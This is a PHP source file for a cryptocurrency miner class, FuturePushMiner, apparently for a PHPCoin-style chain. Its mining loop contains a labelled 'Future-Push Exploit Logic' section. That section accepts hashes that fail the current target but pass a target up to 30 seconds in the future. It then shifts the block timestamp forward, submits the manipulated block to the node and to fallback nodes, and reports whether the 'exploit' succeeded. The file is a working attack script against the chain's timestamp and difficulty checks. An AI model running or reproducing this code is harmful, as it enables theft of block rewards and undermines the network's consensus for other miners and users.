<?php

require_once __DIR__ . '/Miner.php';

class FuturePushMiner extends Miner
{
    public $slipTime = 20; // Default slip time in seconds

    public function start()
    {
        global $argv;
        $this->miningStat = [
            'started' => time(),
            'hashes' => 0,
            'submits' => 0,
            'accepted' => 0,
            'rejected' => 0,
            'dropped' => 0,
        ];
        $start_time = time();
        $prev_hashes = null;
        $this->sleep_time = (100 - $this->cpu) * 5;

        $this->getMiningNodes();

        while ($this->running) {
            $this->cnt++;

            $info = $this->getMiningInfo();
            if ($info === false) {
                _log("Can not get mining info", 0);
                sleep(3);
                continue;
            }

            if (!isset($info['data']['generator'])) {
                _log("Miner node does not send generator address");
                sleep(3);
                continue;
            }

            if (!isset($info['data']['ip'])) {
                _log("Miner node does not send ip address ", json_encode($info));
                sleep(3);
                continue;
            }

            $ip = $info['data']['ip'];
            if (!Peer::validateIp($ip)) {
                _log("Miner does not have valid ip address: $ip");
                sleep(3);
                continue;
            }

            $height = $info['data']['height'] + 1;
            $block_date = $info['data']['date'];
            $difficulty = $info['data']['difficulty'];
            $reward = $info['data']['reward'];
            $data = [];
            $nodeTime = $info['data']['time'];
            $prev_block_id = $info['data']['block'];
            $chain_id = $info['data']['chain_id'];
            $blockFound = false;


            $now = time();
            $offset = $nodeTime - $now;

            $this->attempt = 0;

            $bl = new Block(null, $this->address, $height, null, null, $data, $difficulty, Block::versionCode($height), null, $prev_block_id);

            $t1 = microtime(true);
            $prev_elapsed = null;
            while (!$blockFound) {
                $this->attempt++;
                if ($this->sleep_time == INF) {
                    $this->running = false;
                    break;
                }
                usleep($this->sleep_time * 1000);

                $now = time();
                $elapsed = $now - $offset - $block_date;
                $new_block_date = $block_date + $elapsed;
                _log("Time=now=$now nodeTime=$nodeTime offset=$offset elapsed=$elapsed", 4);
                $th = microtime(true);
                $bl->argon = $bl->calculateArgonHash($block_date, $elapsed);
                $bl->nonce = $bl->calculateNonce($block_date, $elapsed, $chain_id);
                $bl->date = $block_date;
                $hit = $bl->calculateHit();
                $target = $bl->calculateTarget($elapsed);

                // --- Future-Push Exploit Logic ---
                $slipTime = min(30, $this->slipTime);
                $future_elapsed = $elapsed + $slipTime;
                $future_target = $bl->calculateTarget($future_elapsed);

                $blockFound = ($hit > 0 && $future_target > 0 && $hit > $future_target);

                if ($blockFound && !($hit > $target)) {
                    echo PHP_EOL . "[+] Found a block with a normally INVALID hit: $hit (target: $target)" . PHP_EOL;
                    echo "[+] This hit IS valid for a future-pushed block (future target: $future_target)" . PHP_EOL;
                    echo "[+] Starting Future-Push attack..." . PHP_EOL;

                    $new_block_date = time() + $slipTime;
                    $elapsed = $new_block_date - $block_date;

                    echo "[+] Manipulated elapsed time: $elapsed" . PHP_EOL;
                    echo "[+] Manipulated block date: " . date("r", $new_block_date) . PHP_EOL;
                }
                // --- End Exploit Logic ---


                $this->measureSpeed($t1, $th);

                $s = "PID=" . getmypid() . " Mining attempt={$this->attempt} height=$height difficulty=$difficulty elapsed=$elapsed hit=$hit target=$target speed={$this->speed} submits=" .
                    $this->miningStat['submits'] . " accepted=" . $this->miningStat['accepted'] . " rejected=" . $this->miningStat['rejected'] . " dropped=" . $this->miningStat['dropped'];
                if (!$this->forked && !in_array("--flat-log", $argv)) {
                    echo "$s \r";
                } else {
                    echo $s . PHP_EOL;
                }
                $this->miningStat['hashes']++;
                if ($prev_elapsed != $elapsed && $elapsed % 10 == 0) {
                    $prev_elapsed = $elapsed;
                    $info = $this->getMiningInfo();
                    if ($info !== false) {
                        _log("Checking new block from server " . $info['data']['block'] . " with our block $prev_block_id", 4);
                        if ($info['data']['block'] != $prev_block_id) {
                            _log("New block received", 2);
                            $this->miningStat['dropped']++;
                            break;
                        }
                    }
                }
                $send_interval = 60;
                $t = time();
                $elapsed_send = $t - $start_time;
                if ($elapsed_send >= $send_interval) {
                    $start_time = time();
                    $hashes = $this->miningStat['hashes'] - $prev_hashes;
                    $prev_hashes = $this->miningStat['hashes'];
                    $this->sendStat($hashes, $height, $send_interval);
                }
            }

            if (!$blockFound || $elapsed <= 0) {
                continue;
            }

            $postData = [
                'argon' => $bl->argon,
                'nonce' => $bl->nonce,
                'height' => $height,
                'difficulty' => $difficulty,
                'address' => $this->address,
                'hit' => (string)$hit,
                'target' => (string)$future_target,
                'date' => $new_block_date,
                'elapsed' => $elapsed,
                'minerInfo' => 'phpcoin-miner cli ' . VERSION,
                "version" => MINER_VERSION
            ];

            $this->miningStat['submits']++;
            $res = $this->sendHash($this->node, $postData, $response);
            $accepted = false;
            if ($res) {
                $accepted = true;
            } else {
                if (is_array($this->miningNodes) && count($this->miningNodes) > 0) {
                    foreach ($this->miningNodes as $node) {
                        $res = $this->sendHash($node, $postData, $response);
                        if ($res) {
                            $accepted = true;
                            break;
                        }
                    }
                }
            }

            if ($accepted) {
                _log("Block confirmed", 1);
                $this->miningStat['accepted']++;
                echo "[+] Exploit successful! The manipulated block was accepted by the node." . PHP_EOL;
            } else {
                _log("Block not confirmed: " . $res, 1);
                $this->miningStat['rejected']++;
                echo "[-] Exploit failed. The manipulated block was rejected by the node." . PHP_EOL;
            }

            sleep(3);

            if ($this->block_cnt > 0 && $this->cnt >= $this->block_cnt) {
                break;
            }

            _log("Mining stats: " . json_encode($this->miningStat), 2);
            $minerStatFile = Miner::getStatFile();
            file_put_contents($minerStatFile, json_encode($this->miningStat));
        }

        _log("Miner stopped");
    }
}
